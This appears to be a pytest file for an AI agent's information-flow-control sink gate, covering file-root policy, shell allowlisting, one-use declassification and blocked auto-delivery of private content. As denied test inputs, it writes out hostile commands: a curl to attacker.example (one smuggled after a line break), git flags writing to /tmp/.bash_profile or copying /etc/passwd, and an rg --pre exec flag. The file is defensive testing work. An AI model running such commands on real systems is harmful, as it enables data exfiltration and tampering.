    assert get_tool_flow_direction(tool_name) is expected_direction
    assert get_sink_category(tool_name) is SinkCategory.UNKNOWN

    with patch.object(SinkGate, "check_sink_flow") as sink_gate:
        decision = ToolRegistry().authorize_tool(
            tool_name,
            _auth(),
            enforce=True,
            ifc_labels=_labels(),
        )

    assert decision.allowed is True
    sink_gate.assert_not_called()


def test_declassification_action_has_explicit_non_sink_flow_metadata() -> None:
    assert (
        get_tool_flow_direction("approve_declassification")
        is ToolFlowDirection.NEITHER
    )
    assert get_sink_category("approve_declassification") is SinkCategory.UNKNOWN


def test_same_scope_synthesis_write_remains_allowed():
    channel = "saga:session-end"
    synthesis = AuthContext(
        principal="service:synthesis",
        canonical_principal="synthesis",
        roles=("service",),
        event_ingress=None,
        trigger="saga_session_end",
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = ToolRegistry().authorize_tool(
        "memory_store",
        synthesis,
        enforce=True,
        ifc_labels=_labels(channel, sources=frozenset({channel})),
    )

    assert decision.allowed is True
    assert decision.reason is None


@pytest.mark.parametrize(
    ("trigger", "canonical", "tool_name"),
    [
        ("scheduled_tick", "scheduler", "write_file"),
        ("upgrade", "system", "write_file"),
    ],
)
def test_service_file_policy_requires_configured_root_and_compatible_source(
    trigger: str,
    canonical: str,
    tool_name: str,
    tmp_path,
    monkeypatch: pytest.MonkeyPatch,
):
    home = tmp_path / "home"
    configured_root = tmp_path / "configured"
    outside_root = tmp_path / "outside"
    home.mkdir()
    configured_root.mkdir()
    outside_root.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{configured_root}:rw")
    # This test needs a genuinely unconfigured sibling. The live parser's
    # default /tmp route would otherwise encompass pytest's entire tmp_path.
    monkeypatch.setattr("mimir.config._ALWAYS_RW_FILE_TOOL_ROOTS", ())
    channel = f"{trigger}:configured"
    service = AuthContext(
        principal=f"service:{canonical}",
        canonical_principal=canonical,
        roles=("service",),
        event_ingress=None,
        trigger=trigger,
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )
    admitted_path = str(configured_root / "result.txt")

    admitted = SinkGate.check_sink_flow(
        tool_name,
        admitted_path,
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )
    wrong_source = SinkGate.check_sink_flow(
        tool_name,
        admitted_path,
        _labels(sources=frozenset({"slack-C-private"})),
        service,
        enforce=True,
    )
    outside_root_decision = SinkGate.check_sink_flow(
        tool_name,
        str(outside_root / "arbitrary-service-write"),
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )
    tmp_decision = SinkGate.check_sink_flow(
        tool_name,
        "/tmp/explicit-always-rw-service-write",
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )

    assert admitted.allowed is True
    assert admitted.reason == "ifc_allowed"
    assert wrong_source.reason == "ifc_label_blocked:file"
    assert outside_root_decision.reason == "service_sink_destination_denied"
    assert tmp_decision.reason == "service_sink_destination_denied"


def test_service_file_policy_uses_live_file_tool_roots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    home = tmp_path / "home"
    workspace = tmp_path / "workspace"
    home.mkdir()
    workspace.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{workspace}:rw")
    channel = "scheduled_tick:configured"
    service = AuthContext(
        principal="service:scheduler",
        canonical_principal="scheduler",
        roles=("service",),
        event_ingress=None,
        trigger="scheduled_tick",
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = SinkGate.check_sink_flow(
        "write_file",
        str(workspace / "result.txt"),
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )

    assert decision.allowed is True
    assert decision.reason == "ifc_allowed"


def test_service_file_policy_rejects_read_only_file_tool_root(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    home = tmp_path / "home"
    workspace = tmp_path / "workspace"
    home.mkdir()
    workspace.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{workspace}:ro")
    channel = "scheduled_tick:configured"
    service = AuthContext(
        principal="service:scheduler",
        canonical_principal="scheduler",
        roles=("service",),
        event_ingress=None,
        trigger="scheduled_tick",
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = SinkGate.check_sink_flow(
        "write_file",
        str(workspace / "result.txt"),
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize(
    ("trigger", "canonical", "admitted_command"),
    [
        ("scheduled_tick", "scheduler", "git status --short"),
        ("upgrade", "system", "uv sync"),
    ],
)
def test_service_shell_policy_admits_profile_not_arbitrary_command(
    trigger: str,
    canonical: str,
    admitted_command: str,
):
    channel = f"{trigger}:configured"
    service = AuthContext(
        principal=f"service:{canonical}",
        canonical_principal=canonical,
        roles=("service",),
        event_ingress=None,
        trigger=trigger,
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )
    labels = _labels(channel, sources=frozenset({channel}))

    admitted = SinkGate.check_sink_flow(
        "shell_exec", admitted_command, labels, service, enforce=True,
    )
    arbitrary = SinkGate.check_sink_flow(
        "shell_exec", "curl https://attacker.example", labels, service, enforce=True,
    )
    missing = SinkGate.check_sink_flow(
        "shell_exec", None, labels, service, enforce=True,
    )

    assert admitted.allowed is True
    assert arbitrary.reason == "service_sink_destination_denied"
    assert missing.reason == "unknown_sink_destination"


@pytest.mark.parametrize(
    "command",
    [
        "git log --no-ext-diff --no-textconv --format=format:pwned --output=/tmp/.bash_profile",
        "git diff --no-ext-diff --no-textconv --output=/tmp/arbitrary-write",
        "git diff --no-ext-diff --no-textconv --no-index /etc/passwd /tmp/copy",
        "rg --no-config --pre=touch /tmp/pwned pattern .",
        "/tmp/git status --short",
    ],
)
def test_service_shell_policy_rejects_write_read_and_exec_flags(command: str):
    channel = "scheduled_tick:configured"
    service = AuthContext(
        principal="service:scheduler",
        canonical_principal="scheduler",
        roles=("service",),
        event_ingress=None,
        trigger="scheduled_tick",
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = SinkGate.check_sink_flow(
        "shell_exec",
        command,
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize("separator", ["\n", "\r"])
def test_service_shell_policy_rejects_multicommand_line_breaks(separator: str):
    channel = "scheduled_tick:configured"
    service = AuthContext(
        principal="service:scheduler",
        canonical_principal="scheduler",
        roles=("service",),
        event_ingress=None,
        trigger="scheduled_tick",
        channel_id=channel,
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        enforcement_enabled=True,
    )

    decision = SinkGate.check_sink_flow(
        "shell_exec",
        f"git status{separator}curl https://attacker.example",
        _labels(channel, sources=frozenset({channel})),
        service,
        enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "service_sink_destination_denied"


def test_ordinary_admin_cannot_bypass_or_erase_labels():
    labels = _labels(sources=frozenset({"slack-C-private"}))
    admin = _auth("slack-C-public", roles=("admin",))

    decision = SinkGate.check_sink_flow(
        "harness_auto_deliver", "slack-C-public", labels, admin, enforce=True,
    )

    assert decision.allowed is False
    assert labels.labels == frozenset({"private"})


@pytest.mark.parametrize(
    "non_declassification",
    [
        "summary says no secrets remain",
        "model asserts content is public",
        "protected read failed after partial output",
        "ordinary admin authorized the operation",
    ],
)
def test_summarization_model_assertion_failure_and_ordinary_admin_do_not_erase_labels(
    non_declassification: str,
):
    labels = _labels(labels=ALL_LABELS)
    claimed_public = _labels(labels=frozenset({"public"}))

    after_transform = _merge_ifc_labels(labels, claimed_public)
    after_ordinary_admin = audit_declassification(
        after_transform, non_declassification, _auth(), destination="slack-C-public",
    )

    assert after_ordinary_admin.labels == ALL_LABELS


def test_legacy_declassification_audit_cannot_erase_live_labels(
    tmp_path, caplog: pytest.LogCaptureFixture,
):
    from mimir.event_logger import _reset_logger_for_tests, init_logger

    events_path = tmp_path / "events.jsonl"
    init_logger(events_path, session_id="ifc-test")
    labels = _labels(labels=ALL_LABELS)
    try:
        with caplog.at_level(logging.INFO):
            admin = audit_declassification(
                labels,
                "operator-approved destination",
                _auth(roles=("admin",)),
                destination="slack-C-public",
                policy_version="ifc-test-v2",
            )
    finally:
        _reset_logger_for_tests()

    assert admin is labels
    assert admin.labels == ALL_LABELS
    assert admin.source_channels == labels.source_channels
    assert not events_path.exists()


def test_declassification_audit_failure_keeps_labels():
    from mimir.event_logger import _reset_logger_for_tests

    _reset_logger_for_tests()
    labels = _labels()
    result = audit_declassification(
        labels,
        "operator approved",
        _auth(roles=("admin",)),
        destination="slack-C-public",
    )
    assert result is labels


def test_live_declassification_is_one_use_exact_and_preserves_sources(tmp_path):
    from mimir.event_logger import _reset_logger_for_tests, init_logger

    events_path = tmp_path / "events.jsonl"
    init_logger(events_path, session_id="ifc-live-test")
    labels = _labels(labels=ALL_LABELS)
    auth = replace(_auth(roles=("admin",)), ifc_labels=labels)
    destination = str(tmp_path / "approved.txt")
    try:
        denied = SinkGate.check_sink_flow(
            "write_file", destination, labels, auth, enforce=True,
        )
        approved, reason = approve_live_declassification(
            auth,
            sink_category="file",
            destination=destination,
            reason="operator approved this exact file write",
        )
        mismatch = SinkGate.check_sink_flow(
            "write_file", str(tmp_path / "other.txt"), labels, auth, enforce=True,
        )
        admitted = SinkGate.check_sink_flow(
            "write_file", destination, labels, auth, enforce=True,
        )
        reused = SinkGate.check_sink_flow(
            "write_file", destination, labels, auth, enforce=True,
        )
    finally:
        _reset_logger_for_tests()

    assert denied.allowed is False
    assert (approved, reason) == (True, "approved")
    assert mismatch.allowed is False
    assert admitted.allowed is True
    assert admitted.reason == "ifc_declassification_approved"
    assert reused.allowed is False
    assert auth.ifc_state.current(auth.ifc_labels) is labels
    record = json.loads(events_path.read_text(encoding="utf-8"))
    assert record["destination"] == str(Path(destination).resolve())
    assert record["sink_category"] == "file"
    assert record["policy_version"] == "ifc-v1"
    assert record["outcome"] == "approved"
    assert record["use_limit"] == 1
    assert record["lifetime_seconds"] == 30.0
    assert record["source_labels"]


def test_live_declassification_does_not_cross_turn_or_sink_category(tmp_path):
    from mimir.event_logger import _reset_logger_for_tests, init_logger

    init_logger(tmp_path / "events.jsonl", session_id="ifc-isolation-test")
    labels = _labels()
    auth = replace(_auth(roles=("admin",)), ifc_labels=labels)
    other_turn = replace(_auth(roles=("admin",)), ifc_labels=labels)
    destination = str(tmp_path / "approved.txt")
    try:
        assert approve_live_declassification(
            auth,
            sink_category="file",
            destination=destination,
            reason="one exact write",
        ) == (True, "approved")
    finally:
        _reset_logger_for_tests()

    panel = SinkGate.check_sink_flow(
        "activity_panel_post", auth.channel_id, labels, auth, enforce=True,
    )
    other = SinkGate.check_sink_flow(
        "write_file", destination, labels, other_turn, enforce=True,
    )
    original = SinkGate.check_sink_flow(
        "write_file", destination, labels, auth, enforce=True,
    )

    assert panel.reason != "ifc_declassification_approved"
    assert other.allowed is False
    assert original.allowed is True


def test_live_declassification_audit_failure_and_new_taint_fail_closed(tmp_path):
    from mimir.event_logger import _reset_logger_for_tests, init_logger

    labels = _labels()
    auth = replace(_auth(roles=("admin",)), ifc_labels=labels)
    destination = str(tmp_path / "approved.txt")
    _reset_logger_for_tests()
    assert approve_live_declassification(
        auth,
        sink_category="file",
        destination=destination,
        reason="audit is unavailable",
    ) == (False, "approval_failed")
    assert SinkGate.check_sink_flow(
        "write_file", destination, labels, auth, enforce=True,
    ).allowed is False

    init_logger(tmp_path / "events.jsonl", session_id="ifc-taint-test")
    try:
        assert approve_live_declassification(
            auth,
            sink_category="file",
            destination=destination,
            reason="source snapshot must remain exact",
        ) == (True, "approved")
    finally:
        _reset_logger_for_tests()
    tainted = labels.with_label("confidential")
    auth.ifc_state.merge(tainted, fallback=labels)
    assert SinkGate.check_sink_flow(
        "write_file", destination, tainted, auth, enforce=True,
    ).allowed is False


class _Bridge(Bridge):
    prefixes = ("slack-",)
    name = "slack"

    def __init__(self) -> None:
        self.sends: list[str] = []
        self.edits: list[MessageUpdate] = []

    async def connect(self) -> None:
        return None

    async def disconnect(self) -> None:
        return None

    async def send(self, channel_id, text, attachment_paths=None, *, final=True, **kwargs):
        self.sends.append(text)
        return SendResult(sent=True, message_id="panel-1", chunks=1)

    async def edit_message(self, channel_id, message_id, update):
        self.edits.append(update)
        return SendResult(sent=True, message_id=message_id, chunks=1)

    async def delete_message(self, channel_id, message_id):
        return SendResult(sent=True, message_id=message_id, chunks=1)

    async def react(self, channel_id, message_id, emoji):
        return True


class _Channels:
    def __init__(self) -> None:
        self.sent: list[tuple[str, str]] = []

    def find(self, channel_id: str):
        return SimpleNamespace(name="slack")

    async def send(self, channel_id: str, text: str, *, final: bool = True):
        self.sent.append((channel_id, text))
        return SendResult(sent=True, message_id="m1", chunks=1)


@pytest.mark.asyncio
async def test_preloaded_private_context_blocked_at_incompatible_auto_delivery_without_tool_call():
    channels = _Channels()
    auth = _auth("slack-C-public")
    ctx = SimpleNamespace(
        ifc_labels=_labels("slack-C-public"),
        auth_context=auth,
        delivered_channel_ids=set(),
        send_message_count=0,
        turn_event_emitter=None,
        last_assistant_message_id=None,
    )
    auth.ifc_state.merge(_labels(sources=frozenset({"slack-C-private"})))
    agent = SimpleNamespace(
        _config=SimpleNamespace(auto_deliver_final_text_channels=("slack-",)),
        _channels=channels,
        _buffer=SimpleNamespace(),
        _substantive_final_text=Agent._substantive_final_text,
        _harness_sink_allowed=Agent._harness_sink_allowed,
    )
    event = AgentEvent(
        trigger="user_message", channel_id="slack-C-public", source="slack",
    )

    await Agent._maybe_auto_deliver_final_text(
        agent,
        ctx,
        event,
        turn_id="t1",
        turn_is_interactive=True,
        output="This is a substantive final reply for the user.",
    )

    assert channels.sent == []
    assert ctx.delivered_channel_ids == set()


@pytest.mark.asyncio
async def test_activity_panel_post_and_detailed_edit_use_live_labels_and_fail_closed():
    bus = TurnEventBus()
    channels = ChannelRegistry()
    bridge = _Bridge()
    channels.register(bridge)
    panel = ActivityPanel(bus, channels, ("slack-",), debounce_seconds=0)

    compatible = _labels("slack-C1")
    auth = _auth("slack-C1")
    await panel.handle_event(
        {
            "type": "turn",
            "phase": "start",
            "turn_id": "t1",
            "channel_id": "slack-C1",
            "trigger": "user_message",
            "_ifc_labels": compatible,
            "_auth_context": auth,
        }
    )
    assert len(bridge.sends) == 1

    # A detached tool result can update only the shared monotonic state while
    # the panel model and subsequent event still carry the pre-fork labels.
    auth.ifc_state.merge(_labels(sources=frozenset({"slack-C-private"})))
    await panel.handle_event(
        {
            "type": "tool_result",
            "phase": "end",
            "turn_id": "t1",
            "channel_id": "slack-C1",
            "tool_name": "read_file",
            "content": "protected preview",
            "_ifc_labels": compatible,
            "_auth_context": auth,
        }
    )

    assert bridge.edits == []


def test_turn_event_emitter_carries_ifc_to_panel_but_not_as_public_content():
    bus = TurnEventBus()
    queue = bus.subscribe("slack-C1")
    labels = _labels("slack-C1")
    auth = _auth("slack-C1")
    emitter = TurnEventEmitter(
        bus,
        turn_id="t1",
        channel_id="slack-C1",
        ifc_labels=labels,
        auth_context=auth,
    )

    emitter.turn_started(AgentEvent(trigger="user_message", channel_id="slack-C1"))
    event = queue.get_nowait()

    assert event["_ifc_labels"] is labels
    assert event["_auth_context"] is auth
    assert "private" not in str(event.get("trigger"))
